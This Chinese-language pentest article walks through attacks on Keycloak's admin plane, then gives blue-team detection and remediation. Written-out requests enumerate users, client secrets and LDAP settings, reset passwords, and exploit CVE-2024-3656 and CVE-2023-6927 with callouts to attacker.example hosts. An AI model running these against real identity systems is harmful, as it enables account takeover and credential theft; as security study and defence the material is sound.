---
title: "Keycloak身份认证平台管理面打点与Admin API利用技术"
date: 2026-06-16T00:20:51+08:00
draft: false
weight: 67
description: "围绕Keycloak身份认证平台相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "身份认证", "Keycloak", "Admin API"]
---

# Keycloak身份认证平台管理面打点与Admin API利用技术

`Keycloak` 是典型的身份认证与 SSO 控制平面。它的价值不在一个登录页，而在它天然汇聚了：

- Realm、Client、Role、Group 与 User 的统一身份模型
- OpenID Connect、OAuth 2.0、SAML、Identity Broker 与 User Federation
- LDAP / AD、社交登录、外部 IdP、MFA 与账号恢复流程
- Admin Console、Account Console 与 Admin REST API
- 登录事件、管理事件、会话、暴力破解防护与审计痕迹

对攻击者来说，Keycloak 一旦暴露到低信任网络，价值通常高于普通后台，因为它可以直接告诉你：

- 企业是否统一用了某个 SSO 入口
- 哪些 realm 对应哪些业务域、环境或租户
- 哪些 client 暴露了回调地址、根地址与前后端系统命名
- 是否接入 LDAP / AD、OIDC / SAML Broker 与外部身份源
- 当前登录、事件、管理操作与会话控制边界
- 某些历史版本里是否存在授权边界缺陷或重定向配置风险

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Keycloak 以及版本路径风格
2. 如何围绕 `.well-known`、Token、JWKS、Realm 与 Admin API 建立身份资产画像
3. 如何从 Client、Identity Provider、LDAP Federation、事件与会话判断真实风险
4. 哪些请求与响应最值得完整留档
5. 蓝队如何从访问日志、事件、管理事件与指标识别这类打点

---

## 0. 攻击面概览

### 0.1 常见路径

现实环境里应同时兼容新旧路径风格：

- `/realms/master/.well-known/openid-configuration`
- `/realms/master/protocol/openid-connect/auth`
- `/realms/master/protocol/openid-connect/token`
- `/realms/master/protocol/openid-connect/userinfo`
- `/realms/master/protocol/openid-connect/certs`
- `/admin/master/console/`
- `/admin/realms`
- `/admin/realms/{realm}/users`
- `/admin/realms/{realm}/clients`
- `/admin/realms/{realm}/groups`
- `/admin/realms/{realm}/events`
- `/admin/realms/{realm}/admin-events`

很多老环境还保留旧前缀：

- `/auth/realms/master/.well-known/openid-configuration`
- `/auth/realms/master/protocol/openid-connect/token`
- `/auth/admin/master/console/`
- `/auth/admin/realms`

### 0.2 认证边界

Keycloak 的核心认证边界通常分为三层：

- OIDC/OAuth 登录与 Token 面
- Account Console 用户自助面
- Admin Console / Admin REST 管理面

实战中要明确区分：

- 能读 `.well-known`、JWKS 与公开认证配置，不等于拿到了后台权限
- 能获得普通 realm 用户 Token，不等于能访问 `Admin REST API`
- 能访问 Admin API，也要继续判断是只读管理、用户管理还是全局 realm 管理

### 0.3 打点收益优先级

按“最快转成真实攻击价值”的顺序，Keycloak 的打点收益通常可排为：

1. 确认是否为 Keycloak，识别路径风格、realm 名称与 OIDC 配置
2. 获取 Token 面反馈，判断是否存在弱口令、直连授权或错误暴露
3. 判断 Admin Console / Admin REST 是否可达，并建立 realm、client、user、group 画像
4. 判断是否接入 LDAP / AD、OIDC / SAML Broker 与外部身份源
5. 判断事件、管理事件、会话与历史授权缺陷是否可继续放大收益

---

## 1. 第一轮打点：确认是否为 Keycloak

### 1.1 `.well-known/openid-configuration`

Keycloak 的 OIDC 发现文档是首轮识别的最高价值入口之一。

#### 请求示例

```http
GET /realms/master/.well-known/openid-configuration HTTP/1.1
Host: sso.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "issuer": "https://sso.target.example/realms/master",
  "authorization_endpoint": "https://sso.target.example/realms/master/protocol/openid-connect/auth",
  "token_endpoint": "https://sso.target.example/realms/master/protocol/openid-connect/token",
  "userinfo_endpoint": "https://sso.target.example/realms/master/protocol/openid-connect/userinfo",
  "end_session_endpoint": "https://sso.target.example/realms/master/protocol/openid-connect/logout",
  "jwks_uri": "https://sso.target.example/realms/master/protocol/openid-connect/certs",
  "introspection_endpoint": "https://sso.target.example/realms/master/protocol/openid-connect/token/introspect",
  "grant_types_supported": [
    "authorization_code",
    "implicit",
    "refresh_token",
    "password",
    "client_credentials",
    "urn:ietf:params:oauth:grant-type:token-exchange"
  ],
  "response_types_supported": [
    "code",
    "none",
    "id_token",
    "token",
    "code id_token",
    "code token",
    "id_token token",
    "code id_token token"
  ]
}
```

这条响应可以直接确认：

- 目标是 OIDC 身份提供者
- Realm 名称与 `issuer`
- Token、UserInfo、JWKS、Introspection 等后续高价值路径
- 是否支持 `password`、`client_credentials`、`token exchange` 等授权模式

### 1.2 JWKS 证书端点

#### 请求示例

```http
GET /realms/master/protocol/openid-connect/certs HTTP/1.1
Host: sso.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "keys": [
    {
      "kid": "zPLkcgG-RuL0WmJm_kN3W0hPcYg",
      "kty": "RSA",
      "alg": "RS256",
      "use": "sig",
      "n": "u0cGdQ8l1G2jR9dD9s3rI5f4WQbP...",
      "e": "AQAB",
      "x5c": [
        "MIICnDCCAYSgAwIBAgIBATANBgkq..."
      ],
      "x5t": "jZ5Yc2v9t0w4g3RkR8K0vJvX2QA"
    }
  ]
}
```

JWKS 端点本身通常不属于漏洞，但很适合在打点阶段记录：

- `kid`
- 签名算法
- 证书链
- 是否存在多把 Key 轮换

对蓝队也很关键，因为后续 Token 验证、密钥轮换与被动取证都要依赖这类元数据。

### 1.3 Admin Console 前端识别

#### 请求示例

```http
GET /admin/master/console/ HTTP/1.1
Host: sso.target.example
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
X-Frame-Options: SAMEORIGIN
```

页面或静态资源中常见特征包括：

- `Keycloak Admin Console`
- `keycloak.js`
- `admin/master/console`
- `keycloak.v2`

### 1.4 旧版 `/auth` 前缀判断

很多自建环境升级不彻底，仍保留旧路由习惯。实战中建议同时测试：

#### 请求示例

```http
GET /auth/realms/master/.well-known/openid-configuration HTTP/1.1
Host: sso.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "issuer": "https://sso.target.example/auth/realms/master",
  "authorization_endpoint": "https://sso.target.example/auth/realms/master/protocol/openid-connect/auth",
  "token_endpoint": "https://sso.target.example/auth/realms/master/protocol/openid-connect/token"
}
```

这一步的意义在于：

- 减少因版本代差漏掉真实入口
- 更准确判断目标是 WildFly 时代还是 Quarkus 时代路径风格
- 为后续日志检索和规则编写提供正确 URL 模板

---

## 2. 第二轮打点：Token 与认证边界

### 2.1 `admin-cli` 密码模式获取管理 Token

官方文档示例长期使用 `admin-cli` 与密码模式调用管理 API。现实环境里该模式未必开启，但它依然是判断认证边界最直接的一步。

#### 请求示例

```http
POST /realms/master/protocol/openid-connect/token HTTP/1.1
Host: sso.target.example
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Connection: close

client_id=admin-cli&username=admin&password=Admin123%21&grant_type=password
```

#### 典型成功响应示例

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6InpQTGtjZ0ctUnVMMFdtSm1fazIzVzBoUGNZZyJ9...",
  "expires_in": 60,
  "refresh_expires_in": 1800,
  "refresh_token": "eyJhbGciOiJIUzI1NiJ9...",
  "token_type": "Bearer",
  "not-before-policy": 0,
  "session_state": "f3f83ed2-26bd-4b10-ae4b-23d23753f418",
  "scope": "profile email"
}
```

#### 典型失败响应示例

```json
{
  "error": "invalid_grant",
  "error_description": "Invalid user credentials"
}
```

如果这里成功，后续就不再是“公开认证面打点”，而是进入：

- Realm 枚举
- User / Group / Client 资产导出
- 管理事件和会话回溯
- 写操作边界验证

### 2.2 `client_credentials` 获取服务账号 Token

较成熟环境经常使用机密客户端服务账号管理 Admin API。

#### 请求示例

```http
POST /realms/master/protocol/openid-connect/token HTTP/1.1
Host: sso.target.example
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Connection: close

client_id=realm-admin-bot&client_secret=2e1f7ef5-0d7d-4d6e-a26e-8f8d1e9a9c8a&grant_type=client_credentials
```

#### 典型响应示例

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6InpQTGtjZ0ctUnVMMFdtSm1fazIzVzBoUGNZZyJ9...",
  "expires_in": 300,
  "token_type": "Bearer",
  "scope": "profile email"
}
```

这类凭据的实战意义很高，因为它往往：

- 生命周期更稳定
- 不依赖浏览器会话
- 更适合自动化导出或批量管理

### 2.3 `userinfo` 用于确认当前 Token 身份

#### 请求示例

```http
GET /realms/master/protocol/openid-connect/userinfo HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "sub": "67a52f84-b422-4ec5-a3e2-7fd6fffd3f38",
  "email_verified": true,
  "preferred_username": "admin",
  "email": "admin@sso.target.example",
  "given_name": "Platform",
  "family_name": "Admin"
}
```

这一步的价值在于：

- 判断当前 Token 绑定的真实用户名
- 确认是否在错误 realm 下拿错了 Token
- 给后续日志关联提供 `sub` 与用户名对照

### 2.4 未授权访问 Admin API 的典型反馈

#### 请求示例

```http
GET /admin/realms HTTP/1.1
Host: sso.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
```

```json
{
  "error": "HTTP 401 Unauthorized"
}
```

这类失败响应同样值得记录，因为它能说明：

- Admin API 在工作
- 当前只是缺少有效 Token，而不是路径错误
- 后续应转向口令、客户端密钥、SSO 会话或历史授权缺陷测试

---

## 3. 第三轮打点：Realm、User、Group、Client 画像

### 3.1 列出全部 Realm

#### 请求示例

```http
GET /admin/realms HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "realm": "master",
    "enabled": true,
    "displayName": "Keycloak Master Realm"
  },
  {
    "realm": "corp-prod",
    "enabled": true,
    "displayName": "Corporate Production"
  },
  {
    "realm": "partner-b2b",
    "enabled": true,
    "displayName": "Partner Federation"
  }
]
```

Realm 列表是身份平台打点的核心资产索引，因为它直接暴露：

- 租户划分
- 生产 / 测试 / B2B / 外部合作环境命名
- 哪些域值得优先深入

### 3.2 读取单个 Realm 配置

#### 请求示例

```http
GET /admin/realms/corp-prod HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "realm": "corp-prod",
  "enabled": true,
  "registrationAllowed": false,
  "registrationEmailAsUsername": true,
  "verifyEmail": true,
  "loginWithEmailAllowed": true,
  "duplicateEmailsAllowed": false,
  "resetPasswordAllowed": true,
  "bruteForceProtected": true,
  "rememberMe": true,
  "accessTokenLifespan": 300
}
```

这类响应能直接帮助判断：

- 是否允许自注册
- 是否强制邮箱验证
- 是否启用暴力破解防护
- Token 生命周期是否过长

### 3.3 枚举用户

#### 请求示例

```http
GET /admin/realms/corp-prod/users?briefRepresentation=true&max=5 HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": "5b651ab9-8d35-4ee7-a03d-3ab8eb5e3022",
    "username": "alice",
    "firstName": "Alice",
    "lastName": "Wang",
    "email": "alice@corp.example",
    "emailVerified": true,
    "enabled": true
  },
  {
    "id": "f45bf953-d915-4a75-867a-bca0cfdb1547",
    "username": "ops-admin",
    "email": "ops-admin@corp.example",
    "emailVerified": true,
    "enabled": true
  }
]
```

这一步通常能快速回收：

- 邮箱格式
- 账号命名规则
- 运维与管理员账号线索
- 后续密码喷洒或社工的候选目标

### 3.4 枚举群组

#### 请求示例

```http
GET /admin/realms/corp-prod/groups?briefRepresentation=true HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": "6865fc6f-5cf9-4705-bd0f-0e7f3e1fe3bc",
    "name": "platform-admins",
    "path": "/platform-admins"
  },
  {
    "id": "b17c7030-2bca-4bb5-8740-731816c80d42",
    "name": "partners",
    "path": "/partners"
  }
]
```

群组命名尤其适合用于：

- 识别权限边界
- 区分内外部租户
- 辅助判断哪些用户或 client 与管理域高度相关

### 3.5 枚举 Client

#### 请求示例

```http
GET /admin/realms/corp-prod/clients?max=5 HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": "0de0db49-c960-4ec2-bc55-7332ee77f5d4",
    "clientId": "grafana",
    "name": "Grafana Production",
    "rootUrl": "https://grafana.corp.example",
    "baseUrl": "/login/generic_oauth",
    "enabled": true,
    "publicClient": false,
    "protocol": "openid-connect"
  },
  {
    "id": "20dbf997-cf1b-406f-8a5a-5b0e5ad8212d",
    "clientId": "argocd",
    "name": "Argo CD",
    "rootUrl": "https://argocd.corp.example",
    "baseUrl": "/auth/callback",
    "enabled": true,
    "publicClient": false,
    "protocol": "openid-connect"
  }
]
```

这一类返回值对打点特别关键，因为它会暴露：

- 真实业务系统名
- SSO 接入应用域名
- 回调路径
- 公共客户端还是机密客户端

### 3.6 读取 Client Secret

如果当前账号有更高权限，应立即验证是否能读出机密客户端密钥。

#### 请求示例

```http
GET /admin/realms/corp-prod/clients/0de0db49-c960-4ec2-bc55-7332ee77f5d4/client-secret HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "type": "secret",
  "value": "ea6fa33b-8d89-43f1-9ab4-588241474f9f"
}
```

这类能力一旦存在，攻击面会显著扩大，因为它可能直接转化为：

- 服务到服务访问
- Token 换取
- 下游应用伪装登录
- 对相关系统的长期访问能力

### 3.7 枚举 Identity Provider

#### 请求示例

```http
GET /admin/realms/corp-prod/identity-provider/instances HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "alias": "azuread",
    "providerId": "oidc",
    "enabled": true,
    "displayName": "Azure AD"
  },
  {
    "alias": "partner-saml",
    "providerId": "saml",
    "enabled": true,
    "displayName": "Partner SAML IdP"
  }
]
```

这一层常常意味着：

- 还存在外部 OIDC / SAML Broker 面
- 可以继续寻找联邦登录配置偏差
- 企业身份边界并不只在 Keycloak 本身

### 3.8 枚举 LDAP / AD Federation 组件

`User Federation` 是 Keycloak 实战里极其高价值的对象，因为它经常直接关联内部目录服务。

#### 请求示例

```http
GET /admin/realms/corp-prod/components?type=org.keycloak.storage.UserStorageProvider HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": "9c50422e-7ca4-4d7b-92db-7f38ec3c4ab7",
    "name": "corp-ad",
    "providerId": "ldap",
    "providerType": "org.keycloak.storage.UserStorageProvider",
    "parentId": "corp-prod",
    "config": {
      "connectionUrl": [
        "ldaps://ad01.corp.example:636"
      ],
      "usersDn": [
        "OU=Employees,DC=corp,DC=example"
      ],
      "bindDn": [
        "CN=svc_keycloak_bind,OU=Service Accounts,DC=corp,DC=example"
      ],
      "vendor": [
        "ad"
      ]
    }
  }
]
```

这类响应的攻击价值极高，因为它会暴露：

- LDAP / AD 地址与端口
- 用户搜索基准 DN
- 绑定账号命名
- 企业目录结构

---

## 4. 第四轮打点：事件、管理事件与会话

### 4.1 用户事件 `events`

#### 请求示例

```http
GET /admin/realms/corp-prod/events?type=LOGIN&max=3 HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "type": "LOGIN",
    "realmId": "corp-prod",
    "clientId": "grafana",
    "userId": "5b651ab9-8d35-4ee7-a03d-3ab8eb5e3022",
    "ipAddress": "10.20.41.18",
    "time": 1781459652000,
    "details": {
      "auth_method": "openid-connect",
      "redirect_uri": "https://grafana.corp.example/login/generic_oauth",
      "username": "alice"
    }
  }
]
```

用户事件的价值在于：

- 识别近期真实活跃用户
- 暴露使用中的客户端
- 暴露源 IP 与回调地址
- 为社工、钓鱼与认证链分析提供线索

### 4.2 管理事件 `admin-events`

#### 请求示例

```http
GET /admin/realms/corp-prod/admin-events?max=3 HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "time": 1781459729000,
    "realmId": "corp-prod",
    "operationType": "UPDATE",
    "resourceType": "CLIENT",
    "resourcePath": "clients/0de0db49-c960-4ec2-bc55-7332ee77f5d4",
    "authDetails": {
      "realmId": "master",
      "clientId": "security-admin-console",
      "userId": "ceaf89fa-b312-42fa-bb5c-e3f91e1d12ff",
      "ipAddress": "10.20.10.21"
    }
  },
  {
    "time": 1781459793000,
    "realmId": "corp-prod",
    "operationType": "CREATE",
    "resourceType": "USER",
    "resourcePath": "users/f45bf953-d915-4a75-867a-bca0cfdb1547",
    "authDetails": {
      "realmId": "master",
      "clientId": "security-admin-console",
      "userId": "ceaf89fa-b312-42fa-bb5c-e3f91e1d12ff",
      "ipAddress": "10.20.10.21"
    }
  }
]
```

这类响应能直接回收：

- 管理操作时间线
- 操作者来源 IP
- 变更对象类型
- 是否通过 Admin Console 还是其它客户端发起

### 4.3 用户会话

#### 请求示例

```http
GET /admin/realms/corp-prod/users/5b651ab9-8d35-4ee7-a03d-3ab8eb5e3022/sessions HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "id": "0f179612-991e-4dfd-b3f7-dadf3d7dfe89",
    "username": "alice",
    "userId": "5b651ab9-8d35-4ee7-a03d-3ab8eb5e3022",
    "ipAddress": "10.20.41.18",
    "start": 1781459600,
    "lastAccess": 1781459727,
    "clients": {
      "grafana": "https://grafana.corp.example",
      "argocd": "https://argocd.corp.example"
    }
  }
]
```

会话面非常适合用于：

- 识别当前登录中的高价值账号
- 判断哪些客户端被真实使用
- 回收内网源地址与管理站线索

### 4.4 暴力破解检测状态

#### 请求示例

```http
GET /admin/realms/corp-prod/attack-detection/brute-force/users/f45bf953-d915-4a75-867a-bca0cfdb1547 HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "disabled": false,
  "numFailures": 3,
  "lastFailure": 1781459804000,
  "lastIPFailure": "203.0.113.25"
}
```

这类数据对红蓝双方都重要：

- 红队可判断喷洒是否已触发风控
- 蓝队可判断外部来源是否正在撞库

---

## 5. 第五轮打点：高风险写操作与历史利用链

### 5.1 重置密码接口

即使没有拿到全局 `realm-admin`，只要具备用户管理能力，就可能继续影响身份平面。

#### 请求示例

```http
PUT /admin/realms/corp-prod/users/f45bf953-d915-4a75-867a-bca0cfdb1547/reset-password HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Content-Type: application/json
Connection: close

{
  "type": "password",
  "value": "TempPassw0rd!",
  "temporary": true
}
```

#### 典型响应示例

```http
HTTP/1.1 204 No Content
```

这类写操作如果成功，说明风险已经从“情报回收”上升到了：

- 账户接管
- 登录链重置
- MFA 绑定流程劫持前置条件

### 5.2 发送强制动作邮件

#### 请求示例

```http
PUT /admin/realms/corp-prod/users/f45bf953-d915-4a75-867a-bca0cfdb1547/execute-actions-email HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Content-Type: application/json
Connection: close

[
  "UPDATE_PASSWORD",
  "VERIFY_EMAIL"
]
```

#### 典型响应示例

```http
HTTP/1.1 204 No Content
```

这一类接口虽然不是直接 RCE，但会显著影响：

- 用户信任链
- 邮件验证流程
- 钓鱼和账户恢复链路

### 5.3 历史风险：`CVE-2024-3656` 管理接口缺失权限检查

2024 年 Keycloak 披露过 `CVE-2024-3656`，核心问题是一些 Admin REST 端点存在缺失授权检查，导致低权限用户可调用本应属于管理面的功能。公开资料与补丁分析中，较受关注的对象包括：

- `testLDAPConnection`
- `getUnmanagedAttributes`
- `getProviders`

其中最有实战价值的是 `testLDAPConnection`，因为它会把 Keycloak 服务器变成一次对外 LDAP 连通性探针。

#### 请求示例

```http
POST /admin/realms/corp-prod/testLDAPConnection HTTP/1.1
Host: sso.target.example
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
Content-Type: application/json
Accept: application/json
Connection: close

{
  "action": "testConnection",
  "connectionUrl": "ldap://ldap-callback.attacker.example:389",
  "bindDn": "cn=admin,dc=example,dc=com",
  "bindCredential": "Password123!",
  "useTruststoreSpi": "ldapsOnly",
  "connectionTimeout": "5000"
}
```

#### 典型成功响应示例

```http
HTTP/1.1 204 No Content
```

#### 典型失败响应示例

```json
{
  "error": "unknown_error"
}
```

这条链在渗透测试中的实际价值不是“直接拿 shell”，而是：

- 证明低权限用户越过了管理边界
- 利用 Keycloak 对攻击者控制的 LDAP 主机发起出站请求
- 验证服务端出网与目录连接能力

### 5.4 历史风险：`CVE-2023-6927` Wildcard Redirect URI 绕过

`CVE-2023-6927` 的核心不是 Admin API，而是身份平台本身的授权端点与错误的重定向校验逻辑。公开分析显示，受影响条件下，攻击者可构造恶意授权 URL，绕过带 `*` 的回调 URI 校验，把授权码或 Token 导向攻击者控制的位置。

#### 请求示例

```http
GET /realms/corp-prod/protocol/openid-connect/auth?client_id=security-admin-console&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fsso.target.example%2Fadmin%2Fmaster%2Fconsole%2F%3A%40attacker.example&state=af4d2f4b6d4c4b73&nonce=fba91277f7284f52 HTTP/1.1
Host: sso.target.example
Connection: close
```

#### 典型利用结果示意

```http
HTTP/1.1 302 Found
Location: https://sso.target.example/admin/master/console/:@attacker.example?code=b2c8f774-bd72-49c0-bd1c-4d4f7dbe1cba&state=af4d2f4b6d4c4b73
```

这类问题的实战意义在于：

- 并不要求直接拿到后台接口权限
- 但能劫持 OAuth/OIDC 授权结果
- 对使用宽松回调规则的管理客户端尤其危险

### 5.5 风险放大点

Keycloak 的高风险通常不是单条接口，而是以下因素叠加：

- `admin-cli` 或服务账号凭据泄露
- 高权限 Token 被长期保留
- Client Secret 可读
- LDAP / AD Federation 绑定信息暴露
- Admin API 版本落后且存在授权缺陷
- Wildcard Redirect URI 被错误配置到高价值客户端

---

## 6. 蓝队日志、审计与处置

### 6.1 反向代理与 HTTP 访问日志

应重点识别对以下路径的连续访问：

- `/realms/*/.well-known/openid-configuration`
- `/realms/*/protocol/openid-connect/token`
- `/realms/*/protocol/openid-connect/certs`
- `/admin/master/console/`
- `/admin/realms`
- `/admin/realms/*/users`
- `/admin/realms/*/clients`
- `/admin/realms/*/components`
- `/admin/realms/*/events`
- `/admin/realms/*/admin-events`

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:18:31:14 +0800] "GET /realms/master/.well-known/openid-configuration HTTP/1.1" 200 4121 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:18:31:19 +0800] "POST /realms/master/protocol/openid-connect/token HTTP/1.1" 400 79 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
203.0.113.25 - - [16/Jun/2026:18:31:31 +0800] "GET /admin/realms/corp-prod/clients?max=5 HTTP/1.1" 200 1628 "-" "python-requests/2.32.3"
```

如果同一来源在短时间内完成：

- `.well-known`
- `token`
- `admin/realms`
- `users`
- `clients`
- `components`

则基本可判定为结构化身份平台打点。

### 6.2 用户事件与管理事件

Keycloak 自身支持用户事件与管理事件，这是身份平面调查最关键的两条线。

#### `events` 响应片段示例

```json
{
  "type": "LOGIN_ERROR",
  "realmId": "corp-prod",
  "clientId": "security-admin-console",
  "ipAddress": "203.0.113.25",
  "error": "invalid_user_credentials",
  "details": {
    "username": "admin"
  }
}
```

#### `admin-events` 响应片段示例

```json
{
  "operationType": "UPDATE",
  "resourceType": "CLIENT",
  "resourcePath": "clients/0de0db49-c960-4ec2-bc55-7332ee77f5d4",
  "authDetails": {
    "clientId": "security-admin-console",
    "ipAddress": "203.0.113.25"
  }
}
```

蓝队排查时应重点关注：

- `LOGIN_ERROR`
- `CODE_TO_TOKEN`
- `REFRESH_TOKEN`
- `UPDATE`
- `CREATE`
- `DELETE`
- 指向 `CLIENT`、`USER`、`REALM`、`IDENTITY_PROVIDER`、`COMPONENT` 的管理事件

### 6.3 服务端日志与分类日志

官方文档明确说明 Keycloak 支持：

- `console`
- `file`
- `syslog`

三类日志处理器，并可按分类启用更细粒度记录。对于身份平台打点，优先建议关注：

- `org.keycloak`
- `org.keycloak.events`
- HTTP access log

#### 日志示例

```text
2026-06-16 18:31:31,229 INFO  [org.keycloak.events] (executor-thread-14) type=LOGIN_ERROR, realmId=master, clientId=security-admin-console, userId=null, ipAddress=203.0.113.25, error=invalid_user_credentials, username=admin
```

#### 日志示例

```text
2026-06-16 18:31:36,514 INFO  [org.keycloak.events] (executor-thread-16) type=CODE_TO_TOKEN, realmId=master, clientId=admin-cli, userId=ceaf89fa-b312-42fa-bb5c-e3f91e1d12ff, ipAddress=203.0.113.25
```

#### 日志示例

```text
2026-06-16 18:31:45,805 INFO  [org.keycloak.events.admin] (executor-thread-17) operationType=GET, resourcePath=users, realmId=corp-prod, authClientId=security-admin-console, authUserId=ceaf89fa-b312-42fa-bb5c-e3f91e1d12ff, ipAddress=203.0.113.25
```

### 6.4 指标与事件度量

官方观测文档说明 Keycloak 可在启用指标后暴露 `/metrics`，并可启用用户事件指标。对蓝队而言，这类指标有助于在没有完整应用日志的情况下做聚合告警。

#### 请求示例

```http
GET /metrics HTTP/1.1
Host: sso.target.example
Accept: text/plain
Connection: close
```

#### 典型响应片段示例

```text
keycloak_user_events_total{realm="corp-prod",event="login"} 1842
keycloak_user_events_total{realm="corp-prod",event="login_error"} 97
keycloak_user_events_total{realm="corp-prod",event="refresh_token"} 15210
```

应特别关注：

- `login_error` 突增
- 某个 realm 的 `login` 与 `code_to_token` 比例异常
- 非办公时段的管理事件和登录高峰

### 6.5 处置建议

发现 Keycloak 正在被打点或已被低权限穿透后，应优先做：

1. 立即收敛 `/admin/*`、`/realms/*/protocol/openid-connect/token`、`/metrics` 的暴露范围
2. 轮换高权限 `admin-cli` 口令、服务账号密钥与高风险 Client Secret
3. 检查是否已有 `admin-events` 中的 `CLIENT`、`USER`、`REALM`、`COMPONENT` 变更
4. 检查是否有未知来源读取过 `components`、`identity-provider/instances`、`client-secret`
5. 检查回调 URI 是否使用了宽松通配规则
6. 核查 Keycloak 版本是否落在 `CVE-2024-3656`、`CVE-2023-6927` 等已知风险区间

长期建议：

- 不在公网直接暴露 Admin Console 与 Admin REST API
- 管理面统一放在受控网络并配合反向代理访问控制
- 禁止高风险客户端使用宽松 `redirect_uri` 通配
- 对 `admin-cli`、服务账号、Client Secret 建立独立轮换制度
- 启用并保留用户事件、管理事件与 HTTP 访问日志
- 对 `/metrics`、事件度量和异常 Token 申请建立行为告警

---

## 7. 复盘清单

### 7.1 红队侧

- 是否确认了新旧路径风格以及真实 realm 名称
- 是否完整记录了 `.well-known`、`token`、`userinfo`、`jwks` 请求与响应
- 是否完成了 realm、user、group、client、identity provider、LDAP federation 画像
- 是否验证了 `client-secret`、会话、事件和管理事件的可读边界
- 是否核查了 `CVE-2024-3656` 与 `CVE-2023-6927` 相关版本和配置条件

### 7.2 蓝队侧

- 是否能识别从 `.well-known -> token -> admin/realms -> users/clients/components` 的连续访问链
- 是否能在 `events` 和 `admin-events` 中关联来源 IP 与操作对象
- 是否能识别 `admin-cli` 或服务账号异常获取 Token
- 是否能发现对 LDAP Federation、Identity Broker 与 Client Secret 的敏感读取

### 7.3 应急侧

- 是否确认是否已有高权限 Token、Client Secret 或管理事件被导出
- 是否确认是否已有密码重置、邮件动作或客户端配置被修改
- 是否完成了高风险 realm、client、broker、LDAP 组件与账号凭据的收敛
- 是否完成了版本修复与回调 URI、Admin API 暴露面的基线复核

---

## 8. 总结

`Keycloak` 的真正风险，不只是“一个 SSO 登录页能不能打开”，而在于它把：

- 身份域划分
- 用户与群组
- OIDC / OAuth / SAML 客户端
- LDAP / AD Federation
- 外部 Broker
- Token 与会话
- 事件与管理事件

统一汇聚到同一套控制平面与 `Admin REST API`。

对打点来说，更值得沉淀的方法学是：

- 先确认 `.well-known`、JWKS、路径风格与 realm
- 再判断 Token 获取方式与管理 API 边界
- 再建立 user、group、client、broker、LDAP 组件画像
- 最后把事件、会话、Client Secret、历史授权缺陷与回调配置风险串起来

只有把这些面连成链，才能把“Keycloak 暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

- [Keycloak Admin REST API](https://www.keycloak.org/docs-api/latest/rest-api/index.html)
- [Server Administration Guide](https://www.keycloak.org/docs/latest/server_admin/)
- [Server Developer Guide: Admin REST API](https://www.keycloak.org/docs/latest/server_development/index.html)
- [Configuring logging](https://www.keycloak.org/server/logging)
- [Monitoring user activities with event metrics](https://www.keycloak.org/observability/event-metrics)
- [GHSA-2cww-fgmg-4jqc / CVE-2024-3656](https://github.com/keycloak/keycloak/security/advisories/GHSA-2cww-fgmg-4jqc)
